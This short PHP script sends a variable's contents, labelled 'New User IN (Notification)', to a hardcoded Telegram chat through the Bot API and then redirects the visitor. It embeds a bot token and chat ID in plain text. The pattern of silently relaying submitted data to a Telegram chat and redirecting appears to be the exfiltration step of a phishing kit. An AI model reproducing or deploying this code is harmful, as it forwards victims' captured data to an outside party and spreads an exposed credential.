<?php
$tgtoken = "6405338804:AAFB4Hq9G_B9YlcI2Fz_fL1aLoUl5YjbHxc";
$newbody = "New User IN (Notification) " . $mybody;

$data = [
 'text' => $newbody,
 'chat_id' => '6001487817'
];

$a = file_get_contents("https://api.telegram.org/bot".$tgtoken."/sendMessage?" . http_build_query($data));

if($a){
    
 header('Refresh:3; URL=./'); }

?>